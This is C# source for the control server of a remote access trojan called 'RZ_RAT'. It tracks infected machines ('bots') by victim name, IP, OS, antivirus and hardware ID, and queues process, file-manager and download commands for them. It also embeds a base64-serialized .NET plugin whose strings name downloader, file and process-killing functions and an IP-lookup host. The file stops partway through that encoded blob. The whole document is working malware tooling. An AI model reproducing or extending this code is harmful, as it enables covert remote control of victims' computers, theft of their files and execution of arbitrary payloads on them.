using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Threading;
using System.Text.RegularExpressions;
using System.Globalization;
using Microsoft.VisualBasic;
using System.Collections;
using System.IO;

namespace RZ_RAT
{

    public class ClientObjects
    {
        public Socket workSocket = null;
        public const int BufferSize = 99999999;
        public byte[] buffer = new byte[BufferSize];
        public StringBuilder sb = new StringBuilder();
        public ProcessForm PF = null;
        public FileManger FM = null;
        public string ip, id , HWID ,name_of_victim , os ,av ,dateofinstall ,DotNet ,timenow = null;
        public List<string> commands = new List<string>();
        #region command_Functions
        public bool thereIsCommands()
        {
                if (commands.Count > 0)
                    return true;
                return false;
        }
        public void removeCommand(string commandID)
        {
            commands.Remove(getCommandByID(commandID));
        }
        public string getCommand()
        {
            if (commands.Count > 0)
                return commands[0];
            return null;
        }
        public string getCommandByID(string commandID)
        {
            string cID = commandID;
            foreach (string command in commands)
            {
                string[] str = Regex.Split(command, "<<>>");
                if (str[1] == cID)
                {
                    return command;
                }

            }
            return null;
        }
        public void addCommand(params string[] Command)
        {
            StringBuilder totalCommand = new StringBuilder() ;
            foreach (string str in Command)
            {
                totalCommand.Append(str);
                totalCommand.Append("<<>>");
            }
            commands.Add(HWID + "<<>>" + Get8CharacterRandomString() + "<<>>" + totalCommand.ToString());
        }
        public string Get8CharacterRandomString()
        {
            string path = Path.GetRandomFileName();
            path = path.Replace(".", ""); // Remove period.
            return path.Substring(0, 8);  // Return 8 character string
        }
        #endregion
    }
    public class CommandObject
    {
        enum CommandName
        {
            Process,FileManger,Download
        };

    }

    public class Server
    {
        public static ManualResetEvent allDone = new ManualResetEvent(false);
        Socket ServerSocket = null;
        int Port = 4562;
        int backlog = 1;
        public Form1 Context = null;
        public List<ClientObjects> ClientsObjs = new List<ClientObjects>();
        public Server (int port ,Form1 context)
        {
            Context = context;
            Port = port;
            ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }
        public void Strat()
        {
            ServerSocket.Bind(new IPEndPoint(IPAddress.Any, Port));
            ServerSocket.Listen(backlog);
            new Thread(new ThreadStart((MethodInvoker)delegate
            {
                while (true)
                {
                    Context.Invoke((MethodInvoker)delegate
                    {
                        Context.label2.Text = "Bots : " + ClientsObjs.Count;
                        Context.label3.Text = "Selected : " + Context.listView1.SelectedItems.Count.ToString();
                        foreach (ListViewItem lv in Context.listView1.Items)
                        {
                            int index_ = (int)lv.Tag;
                            if (GetTimestamp() - int.Parse(ClientsObjs[index_].timenow) > 30)
                            {
                                ClientsObjs.RemoveAt(index_);
                                lv.Remove();
                            }
                        }
                    });
                    System.Threading.Thread.Sleep(1000);
                }
            })).Start();
            while (true)
            {
                allDone.Reset();
                
                ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), ServerSocket);
                allDone.WaitOne();
                
               
            }
        }
        private void AcceptCallback(IAsyncResult ar)
        {
            try
            {
                allDone.Set();
                Socket listener = (Socket)ar.AsyncState;
                Socket client = listener.EndAccept(ar);
                ClientObjects CO = new ClientObjects();
                CO.workSocket = client;
               
                client.BeginReceive(CO.buffer, 0, ClientObjects.BufferSize, 0, new AsyncCallback(ReceiveCallback), CO);
            }
            catch (Exception Ex)
            {
                MessageBox.Show(Ex.Message);
            }
           
        }
        private void ReceiveCallback(IAsyncResult ar)
        {

            try
            {
                String content = String.Empty;
                ClientObjects state = (ClientObjects)ar.AsyncState;
                Socket handler = state.workSocket;
                int bytesRead = handler.EndReceive(ar);
                if (bytesRead > 0)
                {
                    state.sb.Append(Encoding.Default.GetString(state.buffer, 0, bytesRead));
                    content = state.sb.ToString();
                    if (content.IndexOf("[THISISSTRING]") != -1)
                    {
                        Process(state, content.Replace("[THISISSTRING]",""));
                    }
                    else
                    {
                        handler.BeginReceive(state.buffer, 0, ClientObjects.BufferSize, 0, new AsyncCallback(ReceiveCallback), state);
                    }
                   
                }
            }
            catch (Exception Ex)
            {
                MessageBox.Show(Ex.Message);
            }
        }
        private void Process(ClientObjects CO, String data)
        {
            string[] data_ = data.Split(new string[] { "\r\n" }, StringSplitOptions.None);
            try
            {
                string[] order = data_[11].Replace(" ", "").Split(new string[] { "<>" }, StringSplitOptions.None);
                string[] str = Regex.Split(data, "<>");
                int index_ = -1;
                if (order[0] != "getPlugin")
                {
                    string[] information = data_[2].Split(new string[] { "--" }, StringSplitOptions.None);
                    CO.HWID = information[0].Replace("User-Agent: ", "");
                    CO.name_of_victim = information[1];
                    CO.ip = information[2].Replace("\n", "");
                    CO.os = information[3].Replace("?", "");
                    CO.av = information[4];
                    CO.dateofinstall = information[5].Replace("?", "");
                    CO.DotNet = information[6];
                    CO.timenow = information[7];
                    index_ = getClientByHWID(CO.HWID);
                }
               
                switch (order[0])
                {
                    #region getPlugin
                    case "getPlugin":
                        data = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy" +
"BAAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDAHbWV0aG9kMQMHAwMwU3lzdGVtLkRlbGVnYXRl" +
"U2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1i" +
"ZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2Vy" +
"aWFsaXphdGlvbkhvbGRlcgkCAAAACQMAAAAJBAAAAAkFAAAABAIAAAAwU3lzdGVtLkRlbGVnYXRl" +
"U2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdl" +
"dBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVu" +
"dHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50" +
"cnkGBgAAANoBU3lzdGVtLkNvbnZlcnRlcmAyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVy" +
"c2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkz" +
"NGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249Mi4w" +
"LjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0G" +
"BwAAAEttc2NvcmxpYiwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tl" +
"eVRva2VuPWI3N2E1YzU2MTkzNGUwODkGCAAAAAd0YXJnZXQwCQcAAAAGCgAAABpTeXN0ZW0uUmVm" +
"bGVjdGlvbi5Bc3NlbWJseQYLAAAABExvYWQJDAAAAA8DAAAAACYAAAJNWpAAAwAAAAQAAAD//wAA" +
"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" +
"ACoAAzAEAFgAAAAAAAAAAhR9BgAABAIUfQcAAAQCKBoAAAoAAAIDcj8AAHDQGQAAASgzAAAKbzQA" +
"AAp0GQAAAX0GAAAEAgNy5wAAcNAZAAABKDMAAApvNAAACnQZAAABfQcAAAQAKpoAA3I/AABwAnsG" +
"AAAEbzUAAAoAA3LnAABwAnsHAAAEbzUAAAoAKgBCU0pCAQABAAAAAAAMAAAAdjIuMC41MDcyNwAA" +
"AAAFAGwAAADEBgAAI34AADAHAABcBwAAI1N0cmluZ3MAAAAAjA4AAPAAAAAjVVMAfA8AABAAAAAj" +
"R1VJRAAAAIwPAAB8AgAAI0Jsb2IAAAAAAAAAAgAAAVcXAggJCgAAAPolMwAWAAABAAAAMQAAAAgA" +
"AAAHAAAAGAAAABUAAAACAAAAUQAAABIAAAAMAAAAAgAAAAEAAAADAAAAAgAAAAEAAAAAAAoAAQAA" +
"AAAABgBtAGYABgCRAHQABgDlAHQABgD3AHQABgBKATkBBgDuAdwBBgAFAtwBBgAiAtwBBgBBAtwB" +
"BgBaAtwBBgBzAtwBBgCOAtwBBgCpAtwBBgDhAsICBgD1AsICBgADA9wBBgAcA9wBBgBMAzkDSwBg" +
"AwAABgCPA28DBgCvA28DBgDXA80DBgDoA2YABgD0A2YABgADBGYACgAcBBEEBgAzBGYACgBHBDkD" +
"BgBVBGYABgBdBM0DBgCZBGoEBgCpBM0DBgDCBGYABgDlBNkEBgDzBM0DBgAyBRcFBgA5BWYADgBc" +
"BVAFBgBnBRcFBgCGBc0DBgC8Bc0DBgDQBWYABgDWBWYABgDsBWYABgDxBWYABgAnBmYABgBQBmYA" +
"BgBkBmYABgCcBs0DAAAAAAEAAAAAAAEAAQABABAAFQAgAAUAAQABAAEAEAAnACAABQABAAMAAiAQ" +
"ADIAAAAFAAEABwABABAAOAAgAAUABQAKAAEAEAA+ACAABQAFAAsAAQAQAEcAIAAFAAYAEQACIBAA" +
"VQAAAAUABgAWAAYA0QAiAAYA1gAiAAYA2wAiAAYA4AAiAAYAUAE1AAYA1gAiAAYAiwEiAFAgAAAA" +
"AIYAnwAKAAEA7CAAAAAAhhiqABAAAwD0IAAAAACGALAAFAADAEghAAAAAIYAtwAZAAQAqCEAAAAA" +
"hgDCAB0ABAA8IwAAAACGGKoAEAAFAEQjAAAAAIYYqgAQAAUAUCMAAAAAhhiqACUABQDoIwAAAADm" +
"AQgBJQAHAD4kAAAAAIYYqgAQAAkASCQAAAAAhgAWAS0ACQD8JAAAAACGACIBGQANADwlAAAAAIYA" +
"JwEZAA0AkCUAAAAAhgAtAR0ADQC4JQAAAACGAFMBOQAOAAgmAAAAAIYYqgAQAA8AECYAAAAAhgCw" +
"ABQADwBkJgAAAACGAGQBPgAQAMwmAAAAAIYAawEZABEARCcAAAAAhgB5AR0AEQD2JwAAAACGGKoA" +
"EAASAP4nAAAAAIYYqgAQABIAGCgAAAAAhhiqACUAEgB8KAAAAADmAQgBJQAUAAAAAQCPAQAAAgCU" +
"AQAAAQCfAQAAAQDRAAAAAQCjAQAAAgCoAQAAAQCjAQAAAgCoAQAAAQCtAQAAAgDRAAAAAwCyAQAA" +
"BAC1AQAAAQDRAAAAAQC4AQAAAQCfAQAAAQDBAQAAAQDOAQAAAQCjAQAAAgCoAQAAAQCjAQAAAgCo" +
"AQQACQAIAAkAMQCqADkAOQCqADkAQQCqADkASQCqADkAUQCqADkAWQCqADkAYQCqADkAaQCqADkA" +
"cQCqAEMAeQCqADkAgQCqADkAiQCqADkAkQCqAEgAoQCqAE4AqQCqABAAsQDcA1kAuQCqABAAuQDv" +
"A10AwQD6AxkAyQAKBGIA0QCqABAA0QAmBGkA2QA/BBAA4QBPBG8A6QD6AxkACQCqABAA8QCqABAA" +
"+QCqABAA+QCwBH8A8QC6BIcACQHKBIwAEQGqABAAGQH9BJkAGQEHBRkAEQEQBaAACQD6AxkADACq" +
"ABAAyQA+Bb8AMQF1BcYAyQAKBNcAyQB6BQoADACCBd0AQQGQBeMAsQCfBdcAsQCnBekAQQGzBeMA" +
"SQGqADkASQHFBe4AUQH6AxkAWQGqABAAYQEDBgkBGQAVBhIBGQAeBhoBcQEzBlkAcQFDBlkAyQAK" +
"BCABeQFZBjIBeQGqADgBeQFtBkMBgQF8Bk8B0QCNBh0AiQGhBmEBeQH6Ax0AKQCxBm8BKQCqAHUB" +
"cQG+BnsBCQHDBoUB8QCqAIsBAQHUBosBAQHaBpMB+QDnBpgBFACqABAA4QDzBrAB4QAABxkA4QAQ" +
"B7YBFACCBd0AyQAXBxkAyQAfB88BsQAoB+kA4QBEB9QB4QBXBxAALgAjAPQBLgArAOgBLgB7AFsC" +
"LgALAOgBLgATAPQBLgAbAPQBLgBLAPQBLgAzAPoBLgA7APQBLgBjADwCLgBzAFICLgBTABICLgBr" +
"AEkCQwBLAFMAYwBLAFMAowBLAFMAwwBLAFMA4wBLAFMAdQCSAKcA8gAmAVMBWwFoAYABnwG6AdsB" +
"twCoAQSAAAABAAAAAAAAAAAAAAAAACAAAAACAAAAAAAAAAAAAAABAF0AAAAAAAIAAAAAAAAAAAAA" +
"AAEAZgAAAAAAAwAFAAAAAAAAAAAAAQBEBQAAAAAEAAMACAAHAE8A0wAAAAAAADxNb2R1bGU+AGhl" +
"bHBlci5kbGwARG93bmxvYWRlcgBoZWxwZXIARmlsZU1hbmdlcgBmaWxlcwBmdW5jcwBNYWluQ29k" +
"ZQBQcm9jZXNzTWFuZ2VyAHByb2Nlc3MAbXNjb3JsaWIAU3lzdGVtAE9iamVjdABTeXN0ZW0uUnVu" +
"dGltZS5TZXJpYWxpemF0aW9uAElTZXJpYWxpemFibGUAZG93bmxvYWRlcgAuY3RvcgBlbmNvZGUA" +
"Z2V0RHJpdmVycwBnZXRGaWxlc0J5UGF0aABwYXRoAG5hbWUAc2l6ZQB0eXBlAFNlcmlhbGl6YXRp" +
"b25JbmZvAFN0cmVhbWluZ0NvbnRleHQAR2V0T2JqZWN0RGF0YQBnZXRGdWxsSW5mbwBVTklYAGdl" +
"dGlwAEluc3RhbGxEYXRlAFN5c3RlbS5UaHJlYWRpbmcATXV0ZXgAX20ASXNTaW5nbGVJbnN0YW5j" +
"ZQBkZWNvZGUAZ2V0QWxsUHJvY2VzcwBraWxscHJvY2Vzc0J5TmFtZQBwaWQAbGluawBuYW1lb2Zm" +
"aWxlAG9iagBpbmZvAGN0eHQAaHdpZABPUwBBVgBzdHJNdXRleABiYXNlNjRTdHJpbmcAbmFtZU9m" +
"UHJvY2VzcwBTeXN0ZW0uUmVmbGVjdGlvbgBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5" +
"RGVzY3JpcHRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2Vt" +
"Ymx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5" +
"cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDdWx0dXJl" +
"QXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmli" +
"dXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZl" +
"cnNpb25BdHRyaWJ1dGUAU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVi" +
"dWdnaW5nTW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJl" +
"bGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN5c3RlbS5J" +
"TwBQYXRoAEdldFRlbXBQYXRoAFJhbmRvbQBOZXh0AEludDMyAFRvU3RyaW5nAFN0cmluZwBDb25j" +
"YXQAU3lzdGVtLk5ldABXZWJDbGllbnQARG93bmxvYWRGaWxlAElEaXNwb3NhYmxlAERpc3Bvc2UA" +
"UHJvY2VzcwBTdGFydABCb29sZWFuAE1lbW9yeVN0cmVhbQBTeXN0ZW0uUnVudGltZS5TZXJpYWxp" +
"emF0aW9uLkZvcm1hdHRlcnMuQmluYXJ5AEJpbmFyeUZvcm1hdHRlcgBTdHJlYW0AU2VyaWFsaXpl" +
"AFRvQXJyYXkAQ29udmVydABUb0Jhc2U2NFN0cmluZwBTeXN0ZW0uVGV4dABTdHJpbmdCdWlsZGVy" +
"AERyaXZlSW5mbwBHZXREcml2ZXMAZ2V0X05hbWUAQXBwZW5kAFN5c3RlbS5Db2xsZWN0aW9ucy5H" +
"ZW5lcmljAExpc3RgMQBDaGFyAFNwbGl0AFN5c3RlbS5Db3JlAFN5c3RlbS5MaW5xAEVudW1lcmFi" +
"bGUASUVudW1lcmFibGVgMQBMYXN0AFJlcGxhY2UAQWRkAERpcmVjdG9yeQBHZXREaXJlY3Rvcmll" +
"cwBDb21iaW5lAEdldEZpbGVOYW1lAEdldEZpbGVzAEZpbGVJbmZvAGdldF9MZW5ndGgASW50NjQA" +
"U2VyaWFsaXphYmxlQXR0cmlidXRlAFR5cGUAUnVudGltZVR5cGVIYW5kbGUAR2V0VHlwZUZyb21I" +
"YW5kbGUAR2V0VmFsdWUAQWRkVmFsdWUARW52aXJvbm1lbnQAZ2V0X01hY2hpbmVOYW1lAGdldF9V" +
"c2VyTmFtZQBEYXRlVGltZQBnZXRfVXRjTm93AFRpbWVTcGFuAG9wX1N1YnRyYWN0aW9uAGdldF9U" +
"b3RhbFNlY29uZHMARG93bmxvYWRTdHJpbmcARmlsZQBHZXRDcmVhdGlvblRpbWUAT3BlbkV4aXN0" +
"aW5nAEV4aXQARnJvbUJhc2U2NFN0cmluZwBXcml0ZQBzZXRfUG9zaXRpb24ARGVzZXJpYWxpemUA" +
"R2V0UHJvY2Vzc2VzAGdldF9Qcm9jZXNzTmFtZQBnZXRfSWQAVG9VcHBlcgBDb250YWlucwBHZXRG" +
"aWxlTmFtZVdpdGhvdXRFeHRlbnNpb24AR2V0UHJvY2Vzc2VzQnlOYW1lAEtpbGwAAAV8AHwAAANc" +
"AAABAAcuAC4ALgAAAzAAAA1mAG8AbABkAGUAcgAAAyAAAAlmAGkAbABlAAAJcABhAHQAaAAACW4A" +
"YQBtAGUAAAlzAGkAegBlAAAJdAB5AHAAZQAAByAALwAgAAAJdAByAHUAZQAABS0ALQABNWgAdAB0" +
"AHAAOgAvAC8AYwBoAGUAYwBrAGkAcAAuAGQAeQBuAGQAbgBzAC4AbwByAGcALwAAHTwALwBiAG8A" +
"ZAB5AD4APAAvAGgAdABtAGwAPgAAE2QALwBNAE0ALwB5AHkAeQB5AAAJLgBFAFgARQAAB3AAaQBk" +
"AAAAUQ2MieXBsE2CWGXo+V69BwAIt3pcVhk04IkFIAIODg4DIAABBCABDhwDIAAOBCABDg4CBg4H" +
"IAIBEg0REQcgBA4ODg4OAwYSFQQgAQEOBCABHA4EIAEBAgUgAQERTQQgAQEIBQEAAQAAAwAADgQg" +
"AQgIBgADDg4ODgUgAgEODgUAARJxDgkHBg4SaQ4IAgIHIAIBEoCBHAQgAB0FBQABDh0FBgcDEnkO" +
"AgYAAB0SgI0GIAESgIkODwcGEoCJEoCNDh0SgI0IAgcVEoCRARIQBiABHQ4dAwwQAQEeABUSgJ0B" +
"HgADCgEOBQACDg4OBSABARMABQABHQ4OBAABDg4DIAAKFgcKFRKAkQESEBIQDhIQDh0DHQ4IAgoI" +
"AAESgLERgLUHIAIcDhKAsQUgAgEOHAUAAQ4dDgsHCA4ODg4ODg4dDgUAABGAvQogBwEICAgICAgI" +
"CwACEYDBEYC9EYC9AyAADQcHAwgOEYDBBQcCDh0DBgABEYC9DgYHAg4RgL0FAAESFQ4FIAIBAg4E" +
"AAEBCAQHAgICBQABHQUOByADAR0FCAgEIAEBCgYgARwSgIEIBwQdBRJ5HAIHFRKAkQESIAUAAB0S" +
"cQMgAAgUBwgVEoCRARIgEnESIA4dEnEICAIEIAECDgYAAR0ScQ4MBwcScQgOAh0ScQgCCwEABmhl" +
"bHBlcgAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAxOAAAKQEAJGViMmVjYjIwLTcwMGEtNDhk" +
"Yi04Y2ZkLTAwZmNlMTA4YTFjOQAADAEABzEuMC4wLjAAAAgBAAcBAAAAAAgBAAgAAAAAAB4BAAEA" +
"VAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAAAAAAAD3RvJaAAAAAAIAAAAcAQAAyDoAAMgcAABS" +
"U0RTVLK3bKVyFEinqO3tXxBAugQAAABlOlxQcm9qZWN0c1xSWl9SQVRfZml4ZWRfdjJcaGVscGVy" +
"XG9ialxEZWJ1Z1xoZWxwZXIucGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw8" +
"AAAAAAAAAAAAAC48AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgPAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAA" +
"AAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAACgAgAAAAAAAAAAAACg" +
"AjQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAA" +
"AQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBu" +
"AGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEAAIAAAEAUwB0AHIA" +
